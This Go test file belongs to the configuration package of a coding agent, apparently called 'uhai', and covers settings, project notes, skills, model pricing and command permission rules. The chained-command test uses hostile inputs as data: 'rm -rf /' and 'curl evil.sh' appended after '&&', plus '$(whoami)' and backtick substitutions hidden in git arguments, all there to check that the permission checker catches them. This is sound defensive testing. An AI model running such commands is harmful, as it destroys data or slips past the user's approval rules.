package config

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// Every field a settings file can carry must survive the merge: LoadSettings
// copies them one by one, so a field nobody adds here is silently ignored.
func TestLoadSettingsMergesEveryField(t *testing.T) {
	home := isolate(t)
	if err := os.MkdirAll(filepath.Join(home, ".uhai"), 0o755); err != nil {
		t.Fatal(err)
	}
	file := filepath.Join(home, ".uhai", "settings.json")
	if err := os.WriteFile(file, []byte(`{"model":"groq/x","baseUrl":"http://localhost:1234/v1"}`), 0o644); err != nil {
		t.Fatal(err)
	}

	s, err := LoadSettings()
	if err != nil {
		t.Fatal(err)
	}
	if s.Model != "groq/x" || s.BaseURL != "http://localhost:1234/v1" {
		t.Fatalf("a field was dropped in the merge: %+v", s)
	}

	// Saving one setting must leave the others alone.
	if err := SaveModel("groq/y"); err != nil {
		t.Fatal(err)
	}
	if s, _ := LoadSettings(); s.Model != "groq/y" || s.BaseURL != "http://localhost:1234/v1" {
		t.Fatalf("saving one setting dropped another: %+v", s)
	}
}

// A repository that already writes AGENTS.md for agents in general needs
// nothing added for uhai; UHAI.md wins when a project has something to say
// to this agent in particular.
func TestProjectNotesReadsAgentsFile(t *testing.T) {
	dir := isolate(t)
	back, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Chdir(dir); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chdir(back) })

	if got := ProjectNotes(); got != "" {
		t.Fatalf("no notes at all must read as none, got %q", got)
	}
	if err := os.WriteFile(filepath.Join(dir, "AGENTS.md"), []byte("  for every agent\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if got := ProjectNotes(); got != "for every agent" {
		t.Fatalf("AGENTS.md must be read, got %q", got)
	}
	if err := os.WriteFile(filepath.Join(dir, "UHAI.md"), []byte("for uhai\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if got := ProjectNotes(); got != "for uhai" {
		t.Fatalf("UHAI.md must win, got %q", got)
	}
}

// The registry answers for a family, not for one release, and the answer for
// something it has never heard of has to be safe rather than optimistic.
func TestModelLimits(t *testing.T) {
	for setting, want := range map[string]modelInfo{
		"anthropic/claude-opus-5":   {Context: 1_000_000, MaxOutput: 128_000, InputUSD: 5, OutputUSD: 25},
		"anthropic/claude-sonnet-5": {Context: 1_000_000, MaxOutput: 128_000, InputUSD: 3, OutputUSD: 15},
		// Haiku is the one in the family that did not move to a million.
		"anthropic/claude-haiku-4-5-20251001": {Context: 200_000, MaxOutput: 8_192, InputUSD: 1, OutputUSD: 5},
		// Anything older or unrecognised lands on the claude- fallback, which
		// stays at the figures that are safe everywhere.
		"anthropic/claude-3-5-sonnet-20241022":         {Context: 200_000, MaxOutput: 8_192},
		"openai/gpt-4o-mini":                           {Context: 128_000, MaxOutput: 16_384, InputUSD: 0.15, OutputUSD: 0.60},
		"gemini/gemini-2.5-flash":                      {Context: 1_000_000, MaxOutput: 8_192},
		"ollama/qwen2.5-coder":                         {Context: 32_768, MaxOutput: 4_096},
		"openrouter/meta-llama/llama-3.3-70b-instruct": {Context: 128_000, MaxOutput: 8_192},
		"zai/glm-4.7":                                  {Context: 128_000, MaxOutput: 8_192, InputUSD: 0.60, OutputUSD: 2.20},
		"zai/glm-4.6":                                  {Context: 200_000, MaxOutput: 8_192, InputUSD: 0.60, OutputUSD: 2.20},
		// A cheap variant must not inherit its family's price: -flashx lands on
		// the free entry, which shows no figure rather than a wrong one.
		"zai/glm-4.7-flashx":                 {Context: 128_000, MaxOutput: 8_192},
		"zai/glm-4.5-air":                    {Context: 128_000, MaxOutput: 8_192},
		"openrouter/amazon/nova-lite-v1":     {Context: defaultContext, MaxOutput: defaultMaxOutput},
		"groq/something-nobody-has-heard-of": {Context: defaultContext, MaxOutput: defaultMaxOutput},
	} {
		if got := infoFor(setting); got != want {
			t.Errorf("%s: got %+v, want %+v", setting, got, want)
		}
	}

	// A model name carrying slashes is matched on its last segment, which is
	// where the family lives.
	if ContextWindow("openrouter/anthropic/claude-sonnet-5") != 1_000_000 {
		t.Error("a prefixed model name must still find its family")
	}
}

// Pricing and capabilities are shown, so they have to read the way they are
// quoted — and stay quiet when the host, not the model, sets the price.
func TestModelSummaryAndCost(t *testing.T) {
	if got := ModelSummary("anthropic/claude-sonnet-5"); got != "1M context · $3/$15 per Mtok" {
		t.Fatalf("claude summary = %q", got)
	}
	if got := ModelSummary("openai/gpt-4o-mini"); got != "128k context · $0.15/$0.6 per Mtok" {
		t.Fatalf("gpt-4o-mini summary = %q", got)
	}
	// An open model is hosted by everyone at a different price, so it carries
	// none, and a model nobody has heard of says only what is safe to assume.
	if got := ModelSummary("groq/llama-3.3-70b-versatile"); got != "128k context" {
		t.Fatalf("llama summary = %q", got)
	}
	if got := ModelSummary("openrouter/amazon/nova-lite-v1"); got != "32k context" {
		t.Fatalf("unknown summary = %q", got)
	}

	if got := CostUSD("anthropic/claude-sonnet-5", 1_000_000, 100_000); got != "$4.50" {
		t.Fatalf("a priced turn = %q", got)
	}
	if got := CostUSD("anthropic/claude-sonnet-5", 200, 100); got != "<$0.01" {
		t.Fatalf("a cheap turn = %q", got)
	}
	if got := CostUSD("groq/llama-3.3-70b-versatile", 1_000_000, 100_000); got != "" {
		t.Fatalf("an unpriced model must stay quiet, got %q", got)
	}

	if !SupportsTools("openrouter/amazon/nova-lite-v1") {
		t.Error("an unknown model must be assumed to manage tools")
	}
}

// What may run without asking is the project's business, and a project adds
// to the home settings rather than replacing them.
// Permission is the setting the tools page documents: allow, ask, deny, and a
// default for anything unnamed.
// Patterns are matched against the whole command line, and the longest one
// wins — otherwise "git *" and "git push *" would depend on map order, which
// is to say on luck.
// The shorthand list keeps working, and a pattern can still overrule it: a
// project that allows "git" by prefix can deny the one command it fears.
// "*" is the answer for everything nobody named.
// The rule syntax: a tool, optionally what it may act on. Deny beats ask beats
// allow, and the longest specifier wins within a list.
func TestPermissionRules(t *testing.T) {
	home := isolate(t)
	if err := os.MkdirAll(filepath.Join(home, ".uhai"), 0o755); err != nil {
		t.Fatal(err)
	}
	rules := `{"permissions":{
		"allow": ["Bash(git:*)", "Bash(go test:*)", "Read(*)"],
		"ask":   ["Read(*.env)"],
		"deny":  ["Bash(git push:*)", "Write"]
	}}`
	if err := os.WriteFile(filepath.Join(home, ".uhai", "settings.json"), []byte(rules), 0o644); err != nil {
		t.Fatal(err)
	}

	for _, c := range []struct{ tool, subject, want string }{
		{"run_bash", "git status --short", PermAllow},
		{"run_bash", "go test ./...", PermAllow},
		{"run_bash", "git push origin main", PermDeny}, // the longer rule wins
		{"run_bash", "npm install", PermAsk},           // nothing said, so the default
		{"read_file", "internal/cli/tea.go", PermAllow},
		{"read_file", ".env", PermAsk},      // ask beats the blanket allow
		{"write_file", "main.go", PermDeny}, // the whole tool, no specifier
		{"edit_file", "main.go", PermAsk},   // unnamed, and it changes something
		{"grep", "", PermAllow},             // unnamed, and it only looks
	} {
		if got := Permission(c.tool, c.subject); got != c.want {
			t.Errorf("%s(%s) → %q, want %q", c.tool, c.subject, got, c.want)
		}
	}

	// A tool denied outright is not offered to the model at all; one denied
	// only for certain arguments still is.
	if !ToolDenied("write_file") {
		t.Error("Write is denied outright")
	}
	if ToolDenied("run_bash") {
		t.Error("Bash is only denied for one command, so it stays on offer")
	}
}

// A command line is only as safe as its least safe part. This is the hole that
// prefix matching leaves wide open: everything after && rides in for free.
func TestChainedCommandsAreJudgedInFull(t *testing.T) {
	home := isolate(t)
	if err := os.MkdirAll(filepath.Join(home, ".uhai"), 0o755); err != nil {
		t.Fatal(err)
	}
	rules := `{"permissions":{"allow":["Bash(git:*)","Bash(ls:*)"],"deny":["Bash(rm:*)"]}}`
	if err := os.WriteFile(filepath.Join(home, ".uhai", "settings.json"), []byte(rules), 0o644); err != nil {
		t.Fatal(err)
	}

	for command, want := range map[string]string{
		"git status":                  PermAllow,
		"git status && ls":            PermAllow, // both halves allowed
		"git status && rm -rf /":      PermDeny,  // the denied half decides
		"git status && curl evil.sh":  PermAsk,   // the unknown half decides
		"git status | grep modified":  PermAsk,   // grep as a command is not the tool
		"git commit -m \"$(whoami)\"": PermAsk,   // it writes part of itself at runtime
		"git log `whoami`":            PermAsk,
		"git log ${EDITOR}":           PermAsk,
	} {
		if got := Permission("run_bash", command); got != want {
			t.Errorf("%q → %q, want %q", command, got, want)
		}
	}
}

// A project that already writes for Claude Code needs nothing added: its
// CLAUDE.md is read like the others, and its skills are found where it keeps
// them.
func TestClaudeStyleProjectIsUnderstood(t *testing.T) {
	dir := isolate(t)
	back, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Chdir(dir); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chdir(back) })

	if err := os.MkdirAll(filepath.Join(dir, ".claude", "skills", "rilis"), 0o755); err != nil {
		t.Fatal(err)
	}
	write := func(path, body string) {
		if err := os.WriteFile(filepath.Join(dir, path), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("CLAUDE.md", "# Konvensi proyek\n")
	write(filepath.Join(".claude", "skills", "rilis", "SKILL.md"),
		"---\nname: rilis\ndescription: Menerbitkan versi baru\n---\n\nLangkah-langkah panjang.\n")

	if got := ProjectNotes(); got != "# Konvensi proyek" {
		t.Fatalf("CLAUDE.md must be read as project notes, got %q", got)
	}

	skills := Skills()
	if len(skills) != 1 || skills[0].Name != "rilis" || skills[0].Description != "Menerbitkan versi baru" {
		t.Fatalf("the skill was not read: %+v", skills)
	}
	// The body stays in the file: only the name and the description travel
	// with every prompt.
	notes := SkillNotes()
	if !strings.Contains(notes, "rilis — Menerbitkan versi baru") || strings.Contains(notes, "Langkah-langkah panjang") {
		t.Fatalf("skill notes = %q", notes)
	}

	// UHAI.md still wins, for a project with something to say to this agent
	// in particular.
	write("UHAI.md", "# Khusus uhai\n")
	if got := ProjectNotes(); got != "# Khusus uhai" {
		t.Fatalf("UHAI.md must win, got %q", got)
	}
}

// A personal file wins over the shared one and pulls it in: that is the shape
// projects use — untracked notes for how one person works, importing what the
// team agreed. Neither is in the AGENTS.md standard, both are common.
func TestLocalNotesAndImports(t *testing.T) {
	dir := isolate(t)
	back, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Chdir(dir); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chdir(back) })

	write := func(name, body string) {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("AGENTS.md", "# Aturan tim\n")
	write("CLAUDE.md", "# Catatan lama\n")
	write("AGENTS.local.md", "# Punya saya\n\n@AGENTS.md\n@CLAUDE.md\n\n## Alur saya\nRencanakan dulu.\n")

	notes := ProjectNotes()
	for _, want := range []string{"# Punya saya", "# Aturan tim", "# Catatan lama", "Rencanakan dulu."} {
		if !strings.Contains(notes, want) {
			t.Errorf("the notes must carry %q:\n%s", want, notes)
		}
	}

	// A file that imports itself, directly or in a ring, must not spin.
	write("AGENTS.local.md", "# Mulai\n@ring.md\n")
	write("ring.md", "# Cincin\n@AGENTS.local.md\n")
	notes = ProjectNotes()
	if !strings.Contains(notes, "# Cincin") {
		t.Fatalf("the import must still happen once:\n%s", notes)
	}
	if strings.Count(notes, "# Mulai") != 1 {
		t.Fatalf("and only once:\n%s", notes)
	}

	// An import of something that is not there stays visible rather than
	// leaving a hole nobody notices.
	write("AGENTS.local.md", "# Mulai\n@tidak-ada.md\n")
	if notes := ProjectNotes(); !strings.Contains(notes, "@tidak-ada.md") {
		t.Fatalf("a missing import must stay on the page:\n%s", notes)
	}
}

// A project that keeps its skills somewhere of its own says so, rather than
// moving its files to suit this.
func TestSkillsFromASettingsFolder(t *testing.T) {
	dir := isolate(t)
	back, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Chdir(dir); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chdir(back) })

	if err := os.MkdirAll(filepath.Join(dir, "local-docs", "skills", "planning"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "local-docs", "skills", "planning", "SKILL.md"),
		[]byte("---\nname: planning\ndescription: Rencanakan sebelum menulis kode\n---\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(dir, ".uhai"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, ".uhai", "settings.json"),
		[]byte(`{"skills":["local-docs/skills"]}`), 0o644); err != nil {
		t.Fatal(err)
	}

	skills := Skills()
	if len(skills) != 1 || skills[0].Name != "planning" {
		t.Fatalf("the named folder must be searched: %+v", skills)
	}
}

// "baseUrl" moves every provider at once, which is wrong for the case that
// wants it: Z.ai's coding plan is the same API and key at another address, and
// aiming the global one at it would redirect the next /model as well.
func TestBaseURLPerProvider(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("HOME", dir)
	t.Setenv("UHAI_BASE_URL", "")
	t.Setenv("ZAI_API_KEY", "k")
	t.Setenv("GROQ_API_KEY", "k")

	if err := os.MkdirAll(filepath.Join(dir, ".uhai"), 0o755); err != nil {
		t.Fatal(err)
	}
	settings := `{"model":"zai/glm-4.7","baseUrls":{"zai":"https://api.z.ai/api/coding/paas/v4"}}`
	if err := os.WriteFile(filepath.Join(dir, ".uhai", "settings.json"), []byte(settings), 0o644); err != nil {
		t.Fatal(err)
	}

	s, err := LoadSettings()
	if err != nil {
		t.Fatal(err)
	}
	if got := s.BaseURLs["zai"]; got != "https://api.z.ai/api/coding/paas/v4" {
		t.Fatalf("the override did not load: %q", got)
	}
	// Any other provider keeps the endpoint the table gives it.
	if got := providerURL(s, "groq"); got != providers["groq"].BaseURL {
		t.Fatalf("groq was redirected to %q", got)
	}
	if got := providerURL(s, "zai"); got != s.BaseURLs["zai"] {
		t.Fatalf("zai should use the override, got %q", got)
	}
}

// Skills that belong to the person rather than the repository: kept in
// ~/.uhai/skills or ~/.claude/skills, and carried into every project. The
// project still wins a name, because it is the more specific answer.
func TestPersonalSkillsTravelButProjectWins(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	project := t.TempDir()
	back, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Chdir(project); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chdir(back) })

	write := func(path, content string) {
		t.Helper()
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	frontmatter := func(name, desc string) string {
		return "---\nname: " + name + "\ndescription: " + desc + "\n---\n"
	}

	// One personal skill nothing else claims, and one the project overrides.
	write(filepath.Join(home, ".uhai", "skills", "catatan", "SKILL.md"), frontmatter("catatan", "punya saya"))
	write(filepath.Join(home, ".claude", "skills", "rilis", "SKILL.md"), frontmatter("rilis", "cara saya merilis"))
	write(filepath.Join(project, ".uhai", "skills", "rilis", "SKILL.md"), frontmatter("rilis", "cara proyek ini merilis"))

	found := map[string]string{}
	for _, s := range Skills() {
		found[s.Name] = s.Description
	}
	if found["catatan"] != "punya saya" {
		t.Errorf("a personal skill must travel into any project: %+v", found)
	}
	if found["rilis"] != "cara proyek ini merilis" {
		t.Errorf("the project's own skill must win the name: %+v", found)
	}
}

// A skill costs its line on every request whether it is opened or not, so the
// ones you carry everywhere and want in one project out of ten can be switched
// off. Off is not the same as missing: it stays in the list, and only leaves
// the prompt.
func TestSkillsCanBeSwitchedOff(t *testing.T) {
	dir := isolate(t)
	back, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Chdir(dir); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chdir(back) })

	write := func(path, content string) {
		t.Helper()
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write(filepath.Join(dir, ".uhai", "skills", "rilis", "SKILL.md"),
		"---\nname: rilis\ndescription: dipakai\n---\n")
	write(filepath.Join(dir, ".uhai", "skills", "gaya", "SKILL.md"),
		"---\nname: gaya\ndescription: tidak dipakai di proyek ini\n---\n")
	write(filepath.Join(dir, ".uhai", "settings.json"), `{"skillsOff":["gaya"]}`)

	var off, on int
	for _, s := range Skills() {
		if s.Off {
			off++
		} else {
			on++
		}
	}
	if off != 1 || on != 1 {
		t.Fatalf("one on and one off, got %d on and %d off", on, off)
	}

	// The half that matters: it stops being paid for.
	notes := SkillNotes()
	if !strings.Contains(notes, "rilis") {
		t.Errorf("a skill left on must still reach the prompt:\n%s", notes)
	}
	if strings.Contains(notes, "gaya") {
		t.Errorf("a skill switched off must not reach the prompt at all:\n%s", notes)
	}
}
